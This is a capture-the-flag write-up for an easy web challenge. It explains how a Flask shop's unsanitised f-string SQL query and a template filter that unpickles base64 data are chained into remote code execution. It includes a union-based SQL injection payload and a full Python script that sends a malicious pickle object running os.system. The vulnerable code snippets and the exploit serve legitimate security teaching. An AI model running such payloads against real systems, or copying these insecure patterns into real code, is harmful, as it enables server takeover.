# # Info
Difficulty: Easy
# Desc
>The C.O.P (Cult of Pickles) have started up a new web store to sell their merch. We believe that the funds are being used to carry out illicit pickle-based propaganda operations! Investigate the site and try and find a way into their operation!

# Writeup
This is a Insecure Deserialization challenge, the website is built with Flask and processes objects with Pickle.
This machine can be divided into two parts, the first part is SQLi, and the second part is the deserialization.

The SQL query is constructed with format string without any sanitization.
```python
    def select_by_id(product_id):
        return query_db(f"SELECT data FROM products WHERE id='{product_id}', one=True)
```

I tried using stacked queries to insert a malicious base64 string into the database, but the server doesn't support stacked query.
Therefore, I used union based SQLi to select my malicious base64 string.
```
notexist' union select '<b64here>'; -- -
```
Then, the server has defined a custom template filter that deserializes the base64 string.
```python
@app.template_filter('pickle')
def pickle_loads(s):
	return pickle.loads(base64.b64decode(s))
```

```html
<div class="row gx-4 gx-lg-5 align-items-center">
    {% set item = product | pickle %}
        <div class="col-md-6"><img class="card-img-top mb-5 mb-md-0" src="{{ item.image }}" alt="..." /></div>
        <div class="col-md-6">
            <h1 class="display-5 fw-bolder">{{ item.name }}</h1>
            <div class="fs-5 mb-5">
                <span>£{{ item.price }}</span>
             </div>
            <p class="lead">{{ item.description }}</p>
        </div>
</div>
```

Therefore, Pickle will unpickle the malicious object and let us gain RCE on the machine.
```python
import requests
import urllib.parse
import base64
import pickle

url = "http://x.x.x.x:xxxxx/view/notexist"
command = "cp /app/flag.txt /app/application/static/js/flag.txt"

# https://github.com/CalfCrusher/Python-Pickle-RCE-Exploit/blob/main/Pickle-PoC.py
class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

b64obj = base64.b64encode(pickle.dumps(PickleRCE())).decode('utf-8')
payload = urllib.parse.quote(f"' union select '{b64obj}'-- -")

x = requests.get(url=url+payload)
print(x.status_code)
```